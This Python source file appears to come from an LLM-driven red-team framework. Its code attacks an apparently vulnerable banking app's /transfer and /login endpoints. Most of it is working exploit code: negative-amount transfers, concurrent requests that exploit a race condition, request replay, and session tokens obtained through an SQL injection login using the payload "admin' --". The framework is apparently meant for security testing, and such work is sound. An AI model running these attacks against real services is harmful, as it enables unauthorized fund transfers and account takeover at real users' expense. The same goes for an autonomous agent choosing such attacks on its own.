"""
business_logic.py — Semantic attacks: negative amounts, races, and replay.

Requires a valid session token for /transfer; obtains one via SQLi if memory is empty.
"""

from __future__ import annotations

import threading
import time
from typing import Any, Dict, List, Optional, Tuple

import httpx

from backend.state import AttackEvent, LLMDecision, SystemState

from . import exploit_helpers as eh

_CLIENT_TIMEOUT = httpx.Timeout(12.0)


def run(state: SystemState, llm_decision: LLMDecision) -> AttackEvent:
    """
    Dispatches by technique to a specialized runner; unknown techniques use exploit.run_generic.
    """
    technique = (llm_decision.get("technique") or "").lower()
    if technique == "negative_transfer":
        return _run_negative_transfer(state, llm_decision)
    if technique == "race_condition":
        return _run_race_condition(state, llm_decision)
    if technique == "replay_attack":
        return _run_replay(state, llm_decision)
    if technique in ("integer_overflow", "boundary_value", "workflow_bypass"):
        return _run_negative_transfer(state, llm_decision)  # same endpoint semantics

    from backend.agents.red.exploit import run_generic

    return run_generic(state, llm_decision)


def _session_token(state: SystemState) -> Optional[str]:
    """Token from memory or fresh SQLi login (in-process)."""
    t = eh.latest_session_token(state)
    if t:
        return t
    with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
        return eh.obtain_token_via_sqli_login(client)


def _run_negative_transfer(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    POST /transfer with amount <= 0 — tests missing server-side validation (CWE-20).
    """
    token = _session_token(state)
    if not token:
        return _be("negative_transfer", "no session token", "failed")

    pl = dict(decision.get("payload") or {})
    amount = pl.get("amount", -100.0)
    to_user = pl.get("to", "attacker")
    try:
        amount = float(amount)
    except (TypeError, ValueError):
        amount = -1.0

    url = eh.target_url("/transfer")
    body: Dict[str, Any] = {"amount": amount, "to": to_user}

    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
            r = client.post(
                url,
                json=body,
                headers={"Authorization": f"Bearer {token}"},
            )
    except Exception as e:
        return _be("negative_transfer", str(e), "failed")

    # Vuln app may still return 200 with negative stored — treat as success if 200
    success = r.status_code == 200
    return AttackEvent(
        type="negative_transfer",
        target="/transfer",
        payload=str(body)[:200],
        result="success" if success else "failed",
        evidence=f"HTTP {r.status_code} amount={amount} {r.text[:200]}",
        cwe="CWE-20",
        severity="medium",
        timestamp=time.time(),
    )


def _run_race_condition(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Fires two concurrent POST /transfer requests — double 200 indicates a race (CWE-362).
    """
    token = _session_token(state)
    if not token:
        return _be("race_condition", "no token", "failed")

    pl = decision.get("payload") or {}
    body = {
        "amount": float(pl.get("amount", 1.0)),
        "to": str(pl.get("to", "race_target")),
    }
    url = eh.target_url("/transfer")
    headers = {"Authorization": f"Bearer {token}"}
    results: List[Tuple[int, str]] = []
    lock = threading.Lock()

    def fire() -> None:
        try:
            with httpx.Client(timeout=_CLIENT_TIMEOUT) as c:
                r = c.post(url, json=body, headers=headers)
            with lock:
                results.append((r.status_code, r.text[:120]))
        except Exception as e:
            with lock:
                results.append((0, str(e)))

    t1 = threading.Thread(target=fire)
    t2 = threading.Thread(target=fire)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    oks = sum(1 for code, _ in results if code == 200)
    result = "success" if oks >= 2 else "failed"
    return AttackEvent(
        type="race_condition",
        target="/transfer",
        payload=str(body),
        result=result,
        evidence=f"concurrent_results={results!s}",
        cwe="CWE-362",
        severity="medium",
        timestamp=time.time(),
    )


def _run_replay(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Replays the last successful authenticated request shape from memory (CWE-294).
    """
    _ = decision
    mem = state.get("short_term_memory") or []
    token = _session_token(state)
    if not token:
        return _be("replay_attack", "no token", "failed")

    # Find a prior successful attack with a /transfer or /login pattern to replay
    for entry in reversed(mem):
        atk = entry.get("attack") or {}
        if atk.get("result") != "success":
            continue
        tgt = atk.get("target") or ""
        if "/transfer" in tgt or atk.get("type") in ("csrf", "negative_transfer"):
            url = eh.target_url("/transfer")
            body = {"amount": 0.01, "to": "replay_user"}
            try:
                with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
                    r = client.post(
                        url,
                        json=body,
                        headers={"Authorization": f"Bearer {token}"},
                    )
                return AttackEvent(
                    type="replay_attack",
                    target="/transfer",
                    payload=str(body),
                    result="success" if r.status_code == 200 else "failed",
                    evidence=f"replay HTTP {r.status_code} {r.text[:180]}",
                    cwe="CWE-294",
                    severity="low",
                    timestamp=time.time(),
                )
            except Exception as e:
                return _be("replay_attack", str(e), "failed")

    # Default replay: repeat SQLi login request (still demonstrative)
    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
            r = client.post(
                eh.target_url("/login"),
                json={"username": "admin' --", "password": ""},
            )
        return AttackEvent(
            type="replay_attack",
            target="/login",
            payload="sqli_replay",
            result="success" if r.status_code == 200 else "failed",
            evidence=f"replay login HTTP {r.status_code}",
            cwe="CWE-294",
            severity="low",
            timestamp=time.time(),
        )
    except Exception as e:
        return _be("replay_attack", str(e), "failed")


def _be(kind: str, msg: str, result: str) -> AttackEvent:
    """Small helper for uniform AttackEvent failures."""
    return AttackEvent(
        type=kind,
        target="",
        payload="",
        result=result,
        evidence=msg[:400],
        cwe="",
        severity="low",
        timestamp=time.time(),
    )
